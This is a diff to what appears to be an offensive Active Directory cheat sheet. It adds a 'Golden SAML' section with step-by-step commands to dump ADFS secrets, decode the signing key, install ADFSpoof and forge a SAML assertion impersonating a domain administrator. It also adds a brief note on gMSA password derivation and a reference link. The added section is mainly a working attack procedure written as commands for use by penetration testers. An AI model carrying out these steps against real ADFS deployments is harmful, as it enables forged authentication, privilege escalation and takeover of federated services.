@@ -86,6 +86,8 @@
       - [ESC9 - No Security Extension](#esc9---no-security-extension)
       - [Certifried CVE-2022-26923](#certifried-cve-2022-26923)
       - [Pass-The-Certificate](#pass-the-certificate)
+    - [Active Directory Federation Services](#active-directory-federation-services)
+      - [ADFS - Golden SAML](#adfs---golden-saml)
     - [UnPAC The Hash](#unpac-the-hash)
     - [Shadow Credentials](#shadow-credentials)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
@@ -1592,6 +1594,8 @@ Add-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -
 
 > One notable difference between a **Golden Ticket** attack and the **Golden GMSA** attack is that they no way of rotating the KDS root key secret. Therefore, if a KDS root key is compromised, there is no way to protect the gMSAs associated with it.
 
+:warning: You can't "force reset" a gMSA password, because a gMSA's password never changes. The password is derived from the KDS root key and `ManagedPasswordIntervalInDays`, so every Domain Controller can at any time compute what the password is, what it used to be, and what it will be at any point in the future.
+
 * Using [GoldenGMSA](https://github.com/Semperis/GoldenGMSA)
     ```ps1
     # Enumerate all gMSAs
@@ -2638,6 +2642,43 @@ Jane@corp.local is allowed to enroll in the certificate template ESC9 that speci
   certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
   certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"
   ```
+
+### Active Directory Federation Services
+
+#### ADFS - Golden SAML
+
+Requirements:
+* ADFS service account
+* The private key (PFX with the decryption password)
+
+Exploit:
+* Use [mandiant/ADFSDump](https://github.com/mandiant/ADFSDump) to dump ADFS informations
+* Convert PFX and Private key to binary format
+    ```ps1
+    # For the pfx
+    echo AAAAAQAAAAAEE[...]Qla6 | base64 -d > EncryptedPfx.bin
+    # For the private key
+    echo f7404c7f[...]aabd8b | xxd -r -p > dkmKey.bin 
+    ```
+* Create the Golden SAML using [mandiant/ADFSpoof](https://github.com/mandiant/ADFSpoof)
+    ```ps1
+    mkdir ADFSpoofTools
+    cd $_
+    git clone https://github.com/dmb2168/cryptography.git
+    git clone https://github.com/mandiant/ADFSpoof.git 
+    virtualenv3 venvADFSSpoof
+    source venvADFSSpoof/bin/activate
+    pip install lxml
+    pip install signxml
+    pip uninstall -y cryptography
+    cd cryptography
+    pip install -e .
+    cd ../ADFSpoof
+    pip install -r requirements.txt
+    python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin  -s adfs.pentest.lab  saml2 --endpoint https://www.contoso.com/adfs/ls
+    /SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'PENTEST\administrator' --rpidentifier Supervision --assertions '<Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>PENTEST\administrator</AttributeValue></Attribute>'
+    ```
+
 
 ### UnPAC The Hash
 
@@ -4044,3 +4085,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [Exploiting RBCD Using a Normal User Account - tiraniddo.dev - Friday, 13 May 2022](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
 * [Exploring SCCM by Unobfuscating Network Access Accounts - @_xpn_ - Posted on 2022-07-09](https://blog.xpnsec.com/unobfuscating-network-access-accounts/)
 * [.NET Advanced Code Auditing XmlSerializer Deserialization Vulnerability - April 2, 2019 by znlive](https://znlive.com/xmlserializer-deserialization-vulnerability)
+* [Practical guide for Golden SAML - Practical guide step by step to create golden SAML](https://nodauf.dev/p/practical-guide-for-golden-saml/)
